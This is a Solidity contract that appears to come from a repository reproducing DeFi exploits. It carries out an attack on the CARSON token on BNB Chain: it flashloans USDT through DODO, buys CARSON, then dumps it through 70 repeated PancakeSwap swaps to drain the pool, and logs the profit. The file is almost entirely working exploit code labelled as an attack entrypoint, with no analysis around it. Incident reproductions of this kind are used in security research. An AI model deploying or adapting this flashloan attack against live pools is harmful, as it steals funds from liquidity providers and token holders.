import {RuinLocation} from "./ruins/RuinLocation.sol";

import {
    BSC_USD as USDT
} from "../../constants/bsc.sol";

import {IERC20} from "../../interfaces/tokens/IERC20.sol";
import {IPancakeRouter} from "../../interfaces/dex/pancakeswap/IPancakeRouter.sol";

import {BscDppFlashloanHelper} from "../../lib/flashloan/dodo/BscDppFlashloanHelper.sol";

import "forge-std/console.sol";

contract Shaman is BscDppFlashloanHelper, RuinLocation {


    function peek() external {}

    // attack entrypoint
    function beat() external {
        borrowUSDT(type(uint).max);
        console.log("[>*BOOM*<] Profit: %s USDT", IERC20(USDT).balanceOf(address(this)));
    }

    function _flashloanLogic(bytes calldata data) internal override {

        IERC20(USDT).approve(ROUTER, type(uint).max);
        IERC20(CARSON).approve(ROUTER, type(uint).max);
        
        address[] memory _path = new address[](2);
        _path[0] = USDT;
        _path[1] = CARSON;
        IPancakeRouter(payable(ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1500000000000000000000000, 0, _path, address(this), block.timestamp);
        
        (_path[1], _path[0]) = (_path[0], _path[1]);
        for(uint i; i < 70;) {
            IPancakeRouter(payable(ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                5000000000000000000000,
                0,
                _path,
                address(this),
                block.timestamp
            );
            unchecked {
                ++i;
            }
        }

        IPancakeRouter(payable(ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(CARSON).balanceOf(address(this)), 0, _path, address(this), block.timestamp);
    }
}